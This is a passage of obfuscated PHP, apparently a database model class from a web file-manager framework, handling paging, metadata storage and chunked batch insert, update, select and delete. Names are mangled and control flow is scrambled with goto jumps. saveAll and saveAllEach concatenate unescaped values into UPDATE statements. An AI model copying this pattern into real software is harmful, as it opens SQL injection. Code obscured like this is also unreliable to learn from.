$D±²¶Î´Ãˆ[81] . $e®Ä¸”‰•Ã . $D±²¶Î´Ãˆ[368] . $ešùßìè÷; } protected function selectPageReset() { $a‚®ŠÓâµÜ =& $_SERVER[Ü˜]; if (isset($GLOBALS[$a‚®ŠÓâµÜ[369]])) { return; } $GLOBALS[$a‚®ŠÓâµÜ[369]] = isset($GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[370]]) ? $GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[370]] : !1; $GLOBALS[$a‚®ŠÓâµÜ[371]] = isset($GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[360]]) ? $GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[360]] : !1; $GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[370]] = !1; $GLOBALS[$a‚®ŠÓâµÜ[7]][$a‚®ŠÓâµÜ[360]] = !1; } protected function selectPageRestore() { $aÄà‡¬ÒÇÔ =& $_SERVER[Ü˜]; if (!isset($GLOBALS[$aÄà‡¬ÒÇÔ[369]])) { return; } $GLOBALS[$aÄà‡¬ÒÇÔ[7]][$aÄà‡¬ÒÇÔ[370]] = $GLOBALS[$aÄà‡¬ÒÇÔ[369]]; $GLOBALS[$aÄà‡¬ÒÇÔ[7]][$aÄà‡¬ÒÇÔ[360]] = $GLOBALS[$aÄà‡¬ÒÇÔ[371]]; unset($GLOBALS[$aÄà‡¬ÒÇÔ[369]]); unset($GLOBALS[$aÄà‡¬ÒÇÔ[371]]); } protected function selectPage($FÆƒèâ¯àÌ = 200, $b‘®õ©½§ = 1) { goto BáöŸ‰ì‘Ğ; a«ªİ·¦Ã»: $CƒË¬˜Ğµ = 50000; $FÆƒèâ¯àÌ = isset($in[$Fº«±‚ƒç[370]]) && $in[$Fº«±‚ƒç[370]] ? $in[$Fº«±‚ƒç[370]] : $FÆƒèâ¯àÌ; if ($FÆƒèâ¯àÌ === -1) { $in[$Fº«±‚ƒç[370]] = !1; $CƒË¬˜Ğµ = 100000000; $FÆƒèâ¯àÌ = $CƒË¬˜Ğµ; } goto FÀ¤¬Òì–½; Câí…¢ê: $dÉÌøÖ‚Âæ = array(); $Cøç÷›Úõ¼ = 1; if ($b‘®õ©½§ == 1 && $Cøç÷›Úõ¼) { $this->optionsValue($c¡Ã©š§‚); $dÉÌøÖ‚Âæ = $this->page($b‘®õ©½§, $FÆƒèâ¯àÌ)->select(); $bì Ş…ò©¥ = is_array($dÉÌøÖ‚Âæ) ? count($dÉÌøÖ‚Âæ) : 0; if ($bì Ş…ò©¥ < $FÆƒèâ¯àÌ) { $d²‚Î±œÏÏ = 1; } else { $this->optionsValue($FŒº®×ŞŒç); $bì Ş…ò©¥ = intval($this->count()); $d²‚Î±œÏÏ = ceil($bì Ş…ò©¥ / $FÆƒèâ¯àÌ); } } else { $this->optionsValue($FŒº®×ŞŒç); $bì Ş…ò©¥ = intval($this->count()); $d²‚Î±œÏÏ = ceil($bì Ş…ò©¥ / $FÆƒèâ¯àÌ); $b‘®õ©½§ = $b‘®õ©½§ >= $d²‚Î±œÏÏ ? $d²‚Î±œÏÏ : $b‘®õ©½§; $this->optionsValue($c¡Ã©š§‚); $dÉÌøÖ‚Âæ = $this->page($b‘®õ©½§, $FÆƒèâ¯àÌ)->select(); } goto e©Ô“™Ú•; aÎãƒ„æ„: $FÆƒèâ¯àÌ = $FÆƒèâ¯àÌ <= 5 ? 5 : ($FÆƒèâ¯àÌ >= $CƒË¬˜Ğµ ? $CƒË¬˜Ğµ : $FÆƒèâ¯àÌ); $b‘®õ©½§ = intval(isset($in[$Fº«±‚ƒç[360]]) && $in[$Fº«±‚ƒç[360]] ? $in[$Fº«±‚ƒç[360]] : $b‘®õ©½§); $b‘®õ©½§ = $b‘®õ©½§ <= 1 ? 1 : $b‘®õ©½§; goto Câí…¢ê; FÀ¤¬Òì–½: $FŒº®×ŞŒç = $c¡Ã©š§‚; $FŒº®×ŞŒç[$Fº«±‚ƒç[372]] = array(); $FÆƒèâ¯àÌ = intval($FÆƒèâ¯àÌ); goto aÎãƒ„æ„; FâÁ¿ÉÆÒŠ: return $c·Ë’Â¬ğ÷; goto F»¿ÆÎÕÄ; e©Ô“™Ú•: if (!is_array($dÉÌøÖ‚Âæ)) { $dÉÌøÖ‚Âæ = array(); } if ($d²‚Î±œÏÏ == 1) { $bì Ş…ò©¥ = count($dÉÌøÖ‚Âæ); } $c·Ë’Â¬ğ÷ = array($Fº«±‚ƒç[373] => array($Fº«±‚ƒç[374] => $bì Ş…ò©¥, $Fº«±‚ƒç[370] => $FÆƒèâ¯àÌ, $Fº«±‚ƒç[360] => $b‘®õ©½§, $Fº«±‚ƒç[375] => $d²‚Î±œÏÏ), $Fº«±‚ƒç[376] => $dÉÌøÖ‚Âæ); goto FâÁ¿ÉÆÒŠ; BáöŸ‰ì‘Ğ: $Fº«±‚ƒç =& $_SERVER[Ü˜]; global $in; $c¡Ã©š§‚ = $this->optionsValue(); goto a«ªİ·¦Ã»; F»¿ÆÎÕÄ: } protected function checkLength($eØ·Ä´Æèä, $cç‰³ÃÉ² = 0, $Aêö´øÉÈ = '') { $d½Ê¥ê¯ÀŞ =& $_SERVER[Ü˜]; $cç‰³ÃÉ² = $cç‰³ÃÉ² ? $cç‰³ÃÉ² : 65536; if (!$eØ·Ä´Æèä || strlen($eØ·Ä´Æèä) < $cç‰³ÃÉ²) { return; } $Aêö´øÉÈ = $Aêö´øÉÈ ? $Aêö´øÉÈ . $d½Ê¥ê¯ÀŞ[78] : $d½Ê¥ê¯ÀŞ[33]; show_json($Aêö´øÉÈ . LNG($d½Ê¥ê¯ÀŞ[377]) . "\50{$cç‰³ÃÉ²}\x29", !1); } protected function metaSet($b£İµÄÛâÑ, $bª©…‡ßö¯ = null, $f…Ö™êğ = null) { goto e™ğ§È£ÖÚ; CÃÀÎçˆšÄ: if (is_string($bª©…‡ßö¯)) { $F¨Š«”ôÂÜ[$bª©…‡ßö¯] = $f…Ö™êğ; } $EØ©Ø¸”• = array(); foreach ($F¨Š«”ôÂÜ as $CÜ¾Áæãˆ£ => $b³ó‹µ…À) { $this->checkLength($b³ó‹µ…À, !1, $A›• ö¨¦ï . $aöçİøéˆŞ[4] . $CÜ¾Áæãˆ£); $EØ©Ø¸”•[] = array($e¼µ˜ˆâìµ => $b£İµÄÛâÑ, $aöçİøéˆŞ[103] => $CÜ¾Áæãˆ£, $aöçİøéˆŞ[381] => $b³ó‹µ…À); } goto E¬‹›Ø¶¬; a‡ùÌË‹¡: $A›• ö¨¦ï = $this->tableMeta[$aöçİøéˆŞ[379]]; $béá©¶õŞ = Model($A›• ö¨¦ï); $B‡Å³¨ÏÎ = array($e¼µ˜ˆâìµ => $b£İµÄÛâÑ, $aöçİøéˆŞ[380] => $bª©…‡ßö¯); goto cÌøÛÊµ¨£; B‹ôÃİè: CacheLock::unlock($AÄˆÊïØÊ); return !0; goto Dñ«Û£¤·; cÌøÛÊµ¨£: if (is_null($bª©…‡ßö¯)) { return $béá©¶õŞ->where(array($e¼µ˜ˆâìµ => $b£İµÄÛâÑ))->delete(); } if (is_null($f…Ö™êğ) && is_string($bª©…‡ßö¯)) { return $béá©¶õŞ->where($B‡Å³¨ÏÎ)->delete(); } $F¨Š«”ôÂÜ = is_array($bª©…‡ßö¯) ? $bª©…‡ßö¯ : array(); goto CÃÀÎçˆšÄ; e™ğ§È£ÖÚ: $aöçİøéˆŞ =& $_SERVER[Ü˜]; if (!$this->tableMeta || !$b£İµÄÛâÑ) { return !1; } $e¼µ˜ˆâìµ = $this->tableMeta[$aöçİøéˆŞ[378]]; goto a‡ùÌË‹¡; E¬‹›Ø¶¬: $AÄˆÊïØÊ = $aöçİøéˆŞ[382] . $this->tableMeta; CacheLock::lock($AÄˆÊïØÊ); $béá©¶õŞ->where(array($e¼µ˜ˆâìµ => $b£İµÄÛâÑ))->addAll($EØ©Ø¸”•, array(), !0); goto B‹ôÃİè; Dñ«Û£¤·: } public function metaGet($BºëÃ‘î·, $aŸÒÚİ¦‰ = false) { goto a±ÃÌãÑ‡º; B¾¾ª¾¯: $cÎ®ç«†¢ = $FÚŠ‘ãâ->field($fªáÔª‘«è[383])->where($aÑ³‹Õ•Ñ)->select(); $cÎ®ç«†¢ = array_to_keyvalue($cÎ®ç«†¢, $fªáÔª‘«è[103], $fªáÔª‘«è[381]); return $cÎ®ç«†¢; goto Aùìµ”Ö¡; a±ÃÌãÑ‡º: $fªáÔª‘«è =& $_SERVER[Ü˜]; if (!$this->tableMeta) { return array(); } $BŒó¸ç÷ô = $this->tableMeta[$fªáÔª‘«è[378]]; goto b–”Á„ÄÓâ; b–”Á„ÄÓâ: $FÚŠ‘ãâ = Model($this->tableMeta[$fªáÔª‘«è[379]]); if ($aŸÒÚİ¦‰) { $aÑ³‹Õ•Ñ = array($BŒó¸ç÷ô => $BºëÃ‘î·, $fªáÔª‘«è[103] => $aŸÒÚİ¦‰); return $FÚŠ‘ãâ->where($aÑ³‹Õ•Ñ)->getField($fªáÔª‘«è[381]); } $aÑ³‹Õ•Ñ = array($BŒó¸ç÷ô => $BºëÃ‘î·); goto B¾¾ª¾¯; Aùìµ”Ö¡: } private function checkDataAutoHas($f½…çÎÔ¼) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Eº·È î¦) { if (in_array($f½…çÎÔ¼, explode($_SERVER[Ü˜][47], $Eº·È î¦[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E¡ÂäÅœî®, $e²à¢Ï‡§) { $BñëÜÛ ˜ =& $_SERVER[Ü˜]; foreach ($this->dataAuto as $E´îÒ ©) { $f‡â–ŒÖÁÎ = $E´îÒ ©[0]; if (!in_array($e²à¢Ï‡§, explode($BñëÜÛ ˜[47], $E´îÒ ©[2]))) { continue; } switch (trim($E´îÒ ©[3])) { case $BñëÜÛ ˜[328]: case $BñëÜÛ ˜[329]: $dŠùß‰˜¹œ = $E´îÒ ©[1]; $DøµàåÜÖõ = isset($E´îÒ ©[4]) ? (array) $E´îÒ ©[4] : array(); if ($dŠùß‰˜¹œ == $BñëÜÛ ˜[207] && array_key_exists($f‡â–ŒÖÁÎ, $E¡ÂäÅœî®)) { if (!$E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]) { unset($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]); } break; } if (isset($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ])) { array_unshift($DøµàåÜÖõ, $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]); } if ($BñëÜÛ ˜[328] == $E´îÒ ©[3]) { $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] = call_user_func_array($dŠùß‰˜¹œ, $DøµàåÜÖõ); } else { $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] = call_user_func_array(array(&$this, $dŠùß‰˜¹œ), $DøµàåÜÖõ); } break; case $BñëÜÛ ˜[280]: $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] = $E¡ÂäÅœî®[$E´îÒ ©[1]]; break; case $BñëÜÛ ˜[301]: if (isset($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]) && !is_string($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ])) { $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] = json_encode_force($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]); } break; case $BñëÜÛ ˜[330]: if ($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] === $BñëÜÛ ˜[33]) { unset($E¡ÂäÅœî®[$f‡â–ŒÖÁÎ]); } break; case $BñëÜÛ ˜[331]: $E¡ÂäÅœî®[$f‡â–ŒÖÁÎ] = $E´îÒ ©[1]; default: break; } } if ($e²à¢Ï‡§ == $BñëÜÛ ˜[364]) { $b˜‰˜›ÁÌ‡ = strtolower($this->db->getDbType()); if (strpos($b˜‰˜›ÁÌ‡, $BñëÜÛ ˜[9]) !== 0) { return; } $b¨¸­šÈ„õ = $this->field(!0)->fields; $C„óÜŒ˜«è = $b¨¸­šÈ„õ[$BñëÜÛ ˜[259]]; if (isset($b¨¸­šÈ„õ[$BñëÜÛ ˜[258]])) { unset($C„óÜŒ˜«è[$b¨¸­šÈ„õ[$BñëÜÛ ˜[258]]]); } foreach ($C„óÜŒ˜«è as $eŠÅñÌƒ  => $e²à¢Ï‡§) { if (!isset($E¡ÂäÅœî®[$eŠÅñÌƒ ])) { $E¡ÂäÅœî®[$eŠÅñÌƒ ] = $BñëÜÛ ˜[33]; } } } } private function dataAfterFilter(&$b”»‡¤º—œ) { $AÚÍ®»½ù =& $_SERVER[Ü˜]; foreach ($this->dataAuto as $a‚½¿ø·•Ó) { $F‚é‹º¨Ñ = $a‚½¿ø·•Ó[0]; if (!in_array($AÚÍ®»½ù[366], explode($AÚÍ®»½ù[47], $a‚½¿ø·•Ó[2]))) { continue; } if (!isset($b”»‡¤º—œ[$F‚é‹º¨Ñ])) { continue; } switch (trim($a‚½¿ø·•Ó[3])) { case $AÚÍ®»½ù[328]: case $AÚÍ®»½ù[329]: $FâÚöë½´ = isset($a‚½¿ø·•Ó[4]) ? (array) $a‚½¿ø·•Ó[4] : array(); array_unshift($FâÚöë½´, $b”»‡¤º—œ[$F‚é‹º¨Ñ]); if ($AÚÍ®»½ù[328] == $a‚½¿ø·•Ó[3]) { $b”»‡¤º—œ[$F‚é‹º¨Ñ] = call_user_func_array($a‚½¿ø·•Ó[1], $FâÚöë½´); } else { $b”»‡¤º—œ[$F‚é‹º¨Ñ] = call_user_func_array(array(&$this, $a‚½¿ø·•Ó[1]), $FâÚöë½´); } break; case $AÚÍ®»½ù[280]: $b”»‡¤º—œ[$F‚é‹º¨Ñ] = $b”»‡¤º—œ[$a‚½¿ø·•Ó[1]]; break; case $AÚÍ®»½ù[301]: $F‹á ºë½… = $b”»‡¤º—œ[$F‚é‹º¨Ñ]; $b”»‡¤º—œ[$F‚é‹º¨Ñ] = json_decode($F‹á ºë½…, !0); if (is_null($b”»‡¤º—œ[$F‚é‹º¨Ñ])) { $b”»‡¤º—œ[$F‚é‹º¨Ñ] = $F‹á ºë½…; } break; case $AÚÍ®»½ù[330]: if ($b”»‡¤º—œ[$F‚é‹º¨Ñ] === $AÚÍ®»½ù[33]) { unset($b”»‡¤º—œ[$F‚é‹º¨Ñ]); } break; case $AÚÍ®»½ù[331]: $b”»‡¤º—œ[$F‚é‹º¨Ñ] = $a‚½¿ø·•Ó[1]; default: break; } } } public function saveAll($C‘„âÉ³İ¦) { goto D‡äƒ¨»Ì; F—ïŸàº‚“: $C‘„âÉ³İ¦ = is_array($C‘„âÉ³İ¦) ? $C‘„âÉ³İ¦ : array(); $f´ƒ¿Ëß¶Í = $CÙœÈâœØ”[384]; $eèÒ‡‹Áöˆ = 0; goto Fš²‹¢š„ã; Fš²‹¢š„ã: $EÓ²®ÉË¨ = array(); $bÏ¼ªŸçñê = count($C‘„âÉ³İ¦); for ($b¼Ë‡Â¹ä‡ = 0; $b¼Ë‡Â¹ä‡ < $bÏ¼ªŸçñê; $b¼Ë‡Â¹ä‡++) { $E–Óªøƒ¦ = $C‘„âÉ³İ¦[$b¼Ë‡Â¹ä‡]; if (!is_array($E–Óªøƒ¦) || count($E–Óªøƒ¦) != 4) { continue; } $aÑá¦àÇÙÓ = "\125\120\x44\x41\x54\x45\x20\x60{$fåÏÚ‘†Ÿï}\x60\40\x53\x45\124\40{$E–Óªøƒ¦[2]}\x20\x3d\40\103\x41\x53\x45\x20{$E–Óªøƒ¦[0]}\40\12"; if ($eèÒ‡‹Áöˆ == 0) { $f´ƒ¿Ëß¶Í = $aÑá¦àÇÙÓ; } $EÓ²®ÉË¨[] = $CÙœÈâœØ”[126] . $E–Óªøƒ¦[1] . $CÙœÈâœØ”[126]; $eèÒ‡‹Áöˆ++; $f´ƒ¿Ëß¶Í .= "\x20\x57\110\x45\x4e\x20\47{$E–Óªøƒ¦[1]}\47\40\x54\110\105\x4e\40\47{$E–Óªøƒ¦[3]}\47\x20\12"; if ($eèÒ‡‹Áöˆ == $F…Ş·¬óã‰ || $b¼Ë‡Â¹ä‡ == $bÏ¼ªŸçñê - 1) { goto Eã¥ë‹Ì‰ª; B³Â®Şù‹ê: $EÓ²®ÉË¨ = array(); goto e¶œ‹˜²å ; C‡˜Ê„Í‚Œ: $eèÒ‡‹Áöˆ = 0; $f´ƒ¿Ëß¶Í = $aÑá¦àÇÙÓ; $this->chunkEventCheck(count($EÓ²®ÉË¨)); goto B³Â®Şù‹ê; Eã¥ë‹Ì‰ª: $Fó‚Ø°Ëƒæ = implode($CÙœÈâœØ”[47], $EÓ²®ÉË¨); $f´ƒ¿Ëß¶Í .= "\40\x45\x4e\x44\x20\40\127\110\x45\x52\x45\x20{$E–Óªøƒ¦[0]}\x20\x49\x4e\40\50{$Fó‚Ø°Ëƒæ}\51\40"; $this->execute($f´ƒ¿Ëß¶Í); goto C‡˜Ê„Í‚Œ; e¶œ‹˜²å : } } goto c¨®ïÌÅø¨; c¨®ïÌÅø¨: $this->chunkEventSet(); goto e»ìª®ñÄ“; D‡äƒ¨»Ì: $CÙœÈâœØ” =& $_SERVER[Ü˜]; $fåÏÚ‘†Ÿï = $this->tablePrefix . $this->tableName; $F…Ş·¬óã‰ = self::SQL_WHERE_IN_CHUNK; goto F—ïŸàº‚“; e»ìª®ñÄ“: } public function saveAllEach($Dõ ‹ë¦¼ï) { $DÈ¼Éé­…µ =& $_SERVER[Ü˜]; $AŠø¾å­¹ = $this->tablePrefix . $this->tableName; foreach ($Dõ ‹ë¦¼ï as $e‡âœ Øâö) { if (!is_array($e‡âœ Øâö) || count($e‡âœ Øâö) != 4) { continue; } $Eİ¬ˆÑŠÓŒ = $e‡âœ Øâö[0] . $DÈ¼Éé­…µ[385] . $e‡âœ Øâö[1] . $DÈ¼Éé­…µ[126]; $fê³¸ÕºÍ– = $e‡âœ Øâö[2] . $DÈ¼Éé­…µ[385] . $e‡âœ Øâö[3] . $DÈ¼Éé­…µ[126]; $dÏ†Ëè”¥ = "\165\x70\144\141\x74\145\40{$AŠø¾å­¹}\40\163\145\x74\x20{$fê³¸ÕºÍ–}\x20\x77\x68\x65\162\145\x20{$Eİ¬ˆÑŠÓŒ}\x3b"; $this->execute($dÏ†Ëè”¥); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($d½˜×Úö¬§ = false, $a´ÖÜÑŞğ = false) { $this->_chunkEvent = $d½˜×Úö¬§; $this->_chunkEventParam = $a´ÖÜÑŞğ; } private function chunkEventCheck($b³‘ªÌŠÊË) { if (!$this->_chunkEvent) { return; } $d„‡Ù•°‚Ü = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $d„‡Ù•°‚Ü[$_SERVER[Ü˜][386]] = $b³‘ªÌŠÊË; Hook::trigger($this->_chunkEvent, $d„‡Ù•°‚Ü); } public function addAll($aë§ö×Úš, $BŠ‰†Ğºõ = array(), $e¤ÂäèÒ‡Ú = false) { goto fï›ÅÍÈã¦; fï›ÅÍÈã¦: $cÙÛš ˜Ä‡ =& $_SERVER[Ü˜]; ignore_timeout(); $bµ¹ÙÑÏ÷² = self::SQL_WHERE_IN_CHUNK; goto a´¶öñ…¬‰; a´¶öñ…¬‰: if (empty($aë§ö×Úš)) { $this->error = think_lang($cÙÛš ˜Ä‡[278]); return !1; } $BŠ‰†Ğºõ = $this->_parseOptions($BŠ‰†Ğºõ); foreach ($aë§ö×Úš as $a×°Æí¿©Æ => $dèÈİƒ°à„) { $aë§ö×Úš[$a×°Æí¿©Æ] = $this->_facade($dèÈİƒ°à„); $this->_beforeInsert($aë§ö×Úš[$a×°Æí¿©Æ], $BŠ‰†Ğºõ); } goto bèÕ¹ÑÓ‹‡; bèÕ¹ÑÓ‹‡: if (method_exists($this->db, $cÙÛš ˜Ä‡[279])) { for ($c¯™”ŞÌ = 0; $c¯™”ŞÌ < count($aë§ö×Úš); $c¯™”ŞÌ += $bµ¹ÙÑÏ÷²) { $Aù›˜¢…òÊ = array_slice($aë§ö×Úš, $c¯™”ŞÌ, $bµ¹ÙÑÏ÷²); if (!is_array($Aù›˜¢…òÊ) || count($Aù›˜¢…òÊ) == 0) { break; } $A˜Ò¥çÛô” = $this->db->insertAll($Aù›˜¢…òÊ, $BŠ‰†Ğºõ, $e¤ÂäèÒ‡Ú); $this->chunkEventCheck(count($Aù›˜¢…òÊ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($aë§ö×Úš as $a×°Æí¿©Æ => $dèÈİƒ°à„) { $A˜Ò¥çÛô” = $this->db->insert($dèÈİƒ°à„, $BŠ‰†Ğºõ, $e¤ÂäèÒ‡Ú); } $this->commit(); } if (!1 !== $A˜Ò¥çÛô”) { $e†Ş“÷µà = $this->getLastInsID(); if ($e†Ş“÷µà) { return $e†Ş“÷µà; } } return $A˜Ò¥çÛô”; goto A®Ë™¢¥ëí; A®Ë™¢¥ëí: } public function save($E§ÄóÕÈñì = '', $eÍÖ§»ˆ‹› = array()) { goto c¥ÆàÖ¿Ø™; c¡Â³‰ãç: $dÜ½É¶ŸÒ„ = $this->findWhereField($aœÈ§£“Íğ); if (!$dÜ½É¶ŸÒ„) { return parent::save($E§ÄóÕÈñì, $eÍÖ§»ˆ‹›); } $f¿ÆêªêÏÎ = 0; goto a¿ñ‡Ÿ·ù; c¥ÆàÖ¿Ø™: $BËÊÙÍï‰ò =& $_SERVER[Ü˜]; $D°©ƒÍØç = self::SQL_WHERE_IN_CHUNK; $aœÈ§£“Íğ = $this->optionsValue(); goto c¡Â³‰ãç; a¿ñ‡Ÿ·ù: $AÛéÆ£±  = $aœÈ§£“Íğ[$BËÊÙÍï‰ò[282]][$dÜ½É¶ŸÒ„][1]; $AÛéÆ£±  = is_array($AÛéÆ£± ) ? $AÛéÆ£±  : array(); $C¤ÆÄİé» = count($AÛéÆ£± ); goto CöŸµ›­; CöŸµ›­: for ($d¡‡ÖÌÅï‘ = 0; $d¡‡ÖÌÅï‘ < $C¤ÆÄİé»; $d¡‡ÖÌÅï‘ += $D°©ƒÍØç) { $F”±×ë©· = array_slice($AÛéÆ£± , $d¡‡ÖÌÅï‘, $D°©ƒÍØç); if (!is_array($F”±×ë©·) || count($F”±×ë©·) == 0) { break; } $aœÈ§£“Íğ[$BËÊÙÍï‰ò[282]][$dÜ½É¶ŸÒ„][1] = $F”±×ë©·; $this->optionsValue($aœÈ§£“Íğ); $f¿ÆêªêÏÎ += parent::save($E§ÄóÕÈñì, $eÍÖ§»ˆ‹›); $this->chunkEventCheck(count($F”±×ë©·)); } $this->chunkEventSet(); return $f¿ÆêªêÏÎ; goto EŠåŸò£œá; EŠåŸò£œá: } public function add($fáÈ£È¼×¾ = '', $Fé¼áÁÜ = array(), $bù•Å§½‘õ = false) { if ($this->addTaskStatus && is_array($fáÈ£È¼×¾)) { $this->addTaskData[] = $fáÈ£È¼×¾; return; } return parent::add($fáÈ£È¼×¾, $Fé¼áÁÜ, $bù•Å§½‘õ); } public function parseWhereLike($D¦¡¨Úƒ£, $d¢Œâ‡–ŠÎ = '', $aÜ»††¯¦ = false, &$fáÓŠñ‚¨¶ = false) { goto a›µÊ· ÷; Aİ½·ñÖ¨¹: foreach ($D¦¡¨Úƒ£ as $CÕÄˆã¿õÏ => $bÂ¤²ª–Á±) { if (is_array($bÂ¤²ª–Á±) && count($bÂ¤²ª–Á±) == 2 && $bÂ¤²ª–Á±[0] == $aÎËƒùğ—[389] && is_string($bÂ¤²ª–Á±[1]) && substr($bÂ¤²ª–Á±[1], 0, 1) == $aÎËƒùğ—[390] && substr($bÂ¤²ª–Á±[1], strlen($bÂ¤²ª–Á±[1]) - 1, 1) == $aÎËƒùğ—[390]) { goto CÇéõ«å¥¤; f…ñ”İÉ÷£: continue; goto E„¤¤îçà‡; CÇéõ«å¥¤: $fáÓŠñ‚¨¶ = !0; $E‹ªÛŸŒËÃ = is_string($CÕÄˆã¿õÏ) ? $CÕÄˆã¿õÏ : $d¢Œâ‡–ŠÎ; $F°Šò´Á” = substr($bÂ¤²ª–Á±[1], 1, strlen($bÂ¤²ª–Á±[1]) - 2); goto EˆíÂï™©; EˆíÂï™©: $F°Šò´Á” = $this->db->escapeString($F°Šò´Á”); if (!strpos($E‹ªÛŸŒËÃ, $aÎËƒùğ—[105])) { $E‹ªÛŸŒËÃ = $aÎËƒùğ—[391] . $E‹ªÛŸŒËÃ . $aÎËƒùğ—[391]; } $cÉæ¯¦±Ã® = $aÎËƒùğ—[192] . $F°Šò´Á” . $aÎËƒùğ—[192]; goto dŠÍšÀ­ÛÓ; dŠÍšÀ­ÛÓ: if ($f‘”Ã±Ş“[$aÎËƒùğ—[392]]) { $cÉæ¯¦±Ã® = $aÎËƒùğ—[393] . $F°Šò´Á” . $aÎËƒùğ—[394]; if ($f‘”Ã±Ş“[$aÎËƒùğ—[395]]) { $cÉæ¯¦±Ã® = $aÎËƒùğ—[394] . $F°Šò´Á” . $aÎËƒùğ—[393]; } } $a–Ó£Ó¯¤¹[$EáİÖÙ’ã] = $aÎËƒùğ—[396] . $E‹ªÛŸŒËÃ . $aÎËƒùğ—[397] . $cÉæ¯¦±Ã® . $aÎËƒùğ—[398]; $EáİÖÙ’ã++; goto f…ñ”İÉ÷£; E„¤¤îçà‡: } if (is_array($bÂ¤²ª–Á±)) { $d¢Œâ‡–ŠÎ = is_string($CÕÄˆã¿õÏ) ? $CÕÄˆã¿õÏ : $d¢Œâ‡–ŠÎ; $bÂ¤²ª–Á± = $this->parseWhereLike($bÂ¤²ª–Á±, $d¢Œâ‡–ŠÎ, !0, $fáÓŠñ‚¨¶); } if (is_numeric($CÕÄˆã¿õÏ)) { $a–Ó£Ó¯¤¹[$EáİÖÙ’ã] = $bÂ¤²ª–Á±; $EáİÖÙ’ã++; } else { $a–Ó£Ó¯¤¹[$CÕÄˆã¿õÏ] = $bÂ¤²ª–Á±; } } if ($fáÓŠñ‚¨¶ && !$aÜ»††¯¦) { } return $a–Ó£Ó¯¤¹; goto e¦å±ÊÓï±; a›µÊ· ÷: $aÎËƒùğ— =& $_SERVER[Ü˜]; $f‘”Ã±Ş“ = $GLOBALS[$aÎËƒùğ—[6]][$aÎËƒùğ—[387]]; if (!$f‘”Ã±Ş“[$aÎËƒùğ—[388]]) { return $D¦¡¨Úƒ£; } goto f–­šÜÎ“±; f–­šÜÎ“±: if (!is_array($D¦¡¨Úƒ£)) { return $D¦¡¨Úƒ£; } $a–Ó£Ó¯¤¹ = array(); $EáİÖÙ’ã = 0; goto Aİ½·ñÖ¨¹; e¦å±ÊÓï±: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($c¥ëİöã¨ù = array()) { goto eõÉÏ•Šîº; a¦÷„±ôï¥: return $CªÔì¹‹Ì; goto E…¼ŠÌÎ¸ã; fÚáåŒÌ¦: $ešÍí¢”Ôù = $this->findWhereField($CÀ˜ÊÀ°â†); if (!$ešÍí¢”Ôù || isset($CÀ˜ÊÀ°â†[$cÕ¡â•‰é÷[299]]) || isset($CÀ˜ÊÀ°â†[$cÕ¡â•‰é÷[360]])) { return parent::select($c¥ëİöã¨ù); } $EíËÕ†Ä”ø = $CÀ˜ÊÀ°â†[$cÕ¡â•‰é÷[282]][$ešÍí¢”Ôù][1]; goto e™âÔÔÌ‘í; eõÉÏ•Šîº: $cÕ¡â•‰é÷ =& $_SERVER[Ü˜]; $D¬ÊÛÎÊ£˜ = self::SQL_WHERE_IN_CHUNK; $CÀ˜ÊÀ°â† = $this->optionsValue(); goto fÚáåŒÌ¦; e™âÔÔÌ‘í: $EíËÕ†Ä”ø = is_array($EíËÕ†Ä”ø) ? $EíËÕ†Ä”ø : array(); $CªÔì¹‹Ì = null; for ($cŒÁ§åš¤ = 0; $cŒÁ§åš¤ < count($EíËÕ†Ä”ø); $cŒÁ§åš¤ += $D¬ÊÛÎÊ£˜) { $CÁæ‰êó‚ = array_slice($EíËÕ†Ä”ø, $cŒÁ§åš¤, $D¬ÊÛÎÊ£˜); if (!is_array($CÁæ‰êó‚) || count($CÁæ‰êó‚) == 0) { break; } $CÀ˜ÊÀ°â†[$cÕ¡â•‰é÷[282]][$ešÍí¢”Ôù][1] = $CÁæ‰êó‚; $this->optionsValue($CÀ˜ÊÀ°â†); $Fô§âÛ¢‚ = parent::select($c¥ëİöã¨ù); if (!$Fô§âÛ¢‚) { continue; } $CªÔì¹‹Ì = is_array($CªÔì¹‹Ì) ? $CªÔì¹‹Ì : array(); $CªÔì¹‹Ì = array_merge($CªÔì¹‹Ì, $Fô§âÛ¢‚); } goto a¦÷„±ôï¥; E…¼ŠÌÎ¸ã: } public function delete($cğ‚¨ìğ…‰ = array()) { goto E»®À›“î…; aÄá¢¡Œ¾ß: $Bæà´Íóà = $dŒ¡•Êƒë[$bÍ¼èƒ¦ÂÁ[282]][$aÍ°ì®²ßÁ][1]; $Bæà´Íóà = is_array($Bæà´Íóà) ? $Bæà´Íóà : array(); for ($E†Ë¸ê§ºÏ = 0; $E†Ë¸ê§ºÏ < count($Bæà´Íóà); $E†Ë¸ê§ºÏ += $dîˆŸÂãÆª) { $Aõ‹Ü±¿¿ = array_slice($Bæà´Íóà, $E†Ë¸ê§ºÏ, $dîˆŸÂãÆª); if (!is_array($Aõ‹Ü±¿¿) || count($Aõ‹Ü±¿¿) == 0) { break; } 